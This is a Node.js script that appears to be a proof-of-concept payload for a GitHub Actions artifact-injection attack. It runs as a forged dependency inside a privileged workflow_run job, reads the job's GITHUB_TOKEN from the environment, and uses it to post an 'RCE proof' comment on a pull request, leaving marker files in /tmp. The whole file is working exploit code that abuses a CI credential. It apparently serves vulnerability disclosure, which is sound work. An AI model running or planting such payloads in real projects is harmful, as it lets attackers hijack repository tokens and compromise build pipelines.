const fs = require('fs');
const path = require('path');
fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'executed\n');
(async () => {
  try {
    const init = process.env.INIT_CWD || process.cwd();
    let pr = '1';
    try { pr = fs.readFileSync(path.join(init, 'pr-number.txt'), 'utf8').trim(); } catch (e) {}
    const repo = process.env.GITHUB_REPOSITORY;
    const token = process.env.GITHUB_TOKEN || '';
    const r = await fetch(`https://api.github.com/repos/${repo}/issues/${pr}/comments`, {
      method: 'POST',
      headers: { authorization: `Bearer ${token}`, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
      body: JSON.stringify({ body: '**RCE proof**: arbitrary code executed inside the privileged workflow_run job (artifact-injected .npmrc -> forged dependency) and used the job GITHUB_TOKEN to post this comment.' })
    });
    fs.appendFileSync('/tmp/ADP_RCE_MARKER', `token_present=${token ? 'yes' : 'no'} repo=${repo} comment_status=${r.status}\n`);
  } catch (e) {
    fs.appendFileSync('/tmp/ADP_RCE_MARKER', 'err=' + e.message + '\n');
  }
})();
